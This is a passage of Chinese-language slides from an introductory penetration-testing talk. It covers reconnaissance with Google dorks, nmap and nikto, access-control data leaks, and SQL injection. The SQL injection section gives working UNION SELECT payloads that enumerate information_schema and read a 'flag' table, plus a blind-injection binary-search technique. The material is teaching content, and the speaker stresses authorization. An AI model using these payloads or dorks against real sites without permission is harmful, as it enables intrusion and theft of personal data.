渗透测试
基本技巧与经验分享
讲者: 赵伟捷
自我介绍
ID : OAlienO
姓名 : 赵伟捷
学校系所 : 国立交通大学 电机资讯学士班 大二升大三
社群 : Bamboofox
目录
渗透测试 - Penetration Test ( PT )
情境一 : 收集情报
情境二 : 资料泄漏
情境三 : SQL injection
情境四 : XSS
情境五 : XST
情境六 : CSRF
情境七 : File Upload Vulnerability
Common Vulnerabilities and Exposures ( CVE )
Bug Bounty 与漏洞通报
渗透测试
Penetration Test ( PT )
渗透测试 - Penetration Test ( PT )
简介 : 渗透测试是企业委托骇客对系统进行入侵攻击，并在攻击后
回报潜在漏洞给开发人员做修补。
特性 : 以毒攻毒，针对目标网站。
有授权很重要
标准流程
很多人开始做渗透测试后，就会有人整理一些常见的步骤手法，这
边列出几个开源组织制定的渗透测试标准流程。
OWASP	
  (	
  Open	
  Web	
  Application	
  Security	
  Project	
  )
https://www.owasp.org/index.php/OWASP_Testing_Guide_v4_Table_o
f_Contents
OSSTMM	
  (Open	
  Source	
  Security	
  Testing	
  Methodology	
  Manual)
http://www.isecom.org/research/osstmm.html
PTES ( Penetration	
  Testing	
  Execution	
  Standard )
http://www.pentest-­‐
standard.org/index.php/PTES_Technical_Guidelines
标准流程
提升权限
维持存取
侦查
扫描
漏洞利用
回报漏洞
情境一
假设今天外星人想对某个网站做渗透测试
他要从哪里开始测呢 ? ( 切他电路 )
收集情报
收集情报 ( Information Gathering )
最简单且基本的情报收集可以从看伺服器回应的 http header 开始
收集情报 ( Information Gathering )
Cookie 的名字也可以拿来辨认系统 ( 不一定正确 )
有没有工具呢?
Wappalyzer
( https://chrome.google.com/webstore/detail/wappalyzer/gp
pongmhjkpfnbhagpmjfkannfbllamg?hl=zh-TW )
收集情报 ( Information Gathering )
Chrome 插件
Wappalyzer
收集情报 -­‐ Google Hacking
完整的运用 Google 的强大搜寻功能
inurl: google.com
inurl:google.com
intext:"PHP Fatal error: require()" filetype:log
site:google.com
Google hacking database
https://www.exploit-db.com/google-hacking-database/
这里不能有空白
收集情报 – 找旁注
一个机器可能 host 多个网站
收集情报 -­‐ 使用工具 (	
  nmap )
nmap 
扫 port
收集情报 -­‐ 使用工具 ( nikto )
会提供相关网站
情境二
最常见安全问题 1st round – 资料泄漏
情境 : 
外星人在某网站上申请东东，申请完后得到这个连结，上面显示申
请的资料做确认和列印，会发生什么事情呢，请待下页分晓
https://www.xxx.com/apply_form/?id=123
机敏资料泄漏
网站权限控管没做好，可以浏览其他人的申请单
并看到他填的申请表上面的个人资料
比如 : https://www.xxx.com/apply_form/?id=100
机敏资料泄漏
运用 Google hacking 的技巧，找到不小心公开的档案
intitle:"Index of"
site:nctu.edu.tw filetype:pdf
情境三
最常见安全问题 2nd round – SQL injection
情境 : 
外星人在某网站上看到可以输入的 input box
就很开心地输入单引号…
SQL injection
发现惊人的事实，他会 SQL syntax	
  error
说明他 87% 有 SQL	
  injection	
  漏洞
漏洞利用 – SQL injection
SQL injection 简称 SQLi
开发者常常犯的一个错误的编程方式 : 将要拿去执行的程式码用字
串串接的方式接上使用者可控的字串，统称为注入 ( injection )
$sql = "SELECT	
  id	
  FROM	
  users	
  WHERE	
  uid='$uid';";
$result	
  = $conn-­‐>query($sql);
把使用者可以控制的字串串接到要执行的命令里面
(	
  SQL	
  command	
  )
漏洞利用 – SQL injection
UNION SELECT 技巧
$sql = "SELECT	
  name,addr FROM	
  users	
  WHERE	
  uid='$uid';";
SELECT	
  name,addr FROM	
  users	
  WHERE	
  uid='0'	
  UNION	
  SELECT	
  1,2	
  -­‐-­‐ ';
这里也要两个
这里两个
漏洞利用 – SQL injection
手动挖 DB	
  顺序
schema
table
column
漏洞利用 – SQL injection
id=0	
  UNION	
  SELECT	
  null,null,table_nameFROM	
  information_schema.tables
WHERE	
  table_schema =	
  'news'	
  -­‐-­‐
id=0	
  UNION	
  SELECT	
  null,null,column_nameFROM	
  information_schema.columns
WHERE	
  table_schema =	
  'news'	
  AND	
  table_name =	
  'flag'	
  -­‐-­‐
id=0	
  UNION	
  SELECT	
  null,null,flagFROM	
  flag
直接是一个数字，他 SQL 原本就没包单引号
漏洞利用 – SQL injection
Blind	
  injection	
  :	
  在没有喷 log 的情况下，有机会可以派上会场
id=0	
  AND	
  (	
  …	
  )	
  >	
  49
id=0	
  AND	
  (	
  …	
  )	
  >	
  50
id=0	
  AND	
  (	
  …	
  )	
  >	
  51
…
成功
成功
失败
他是 51
使用 binary search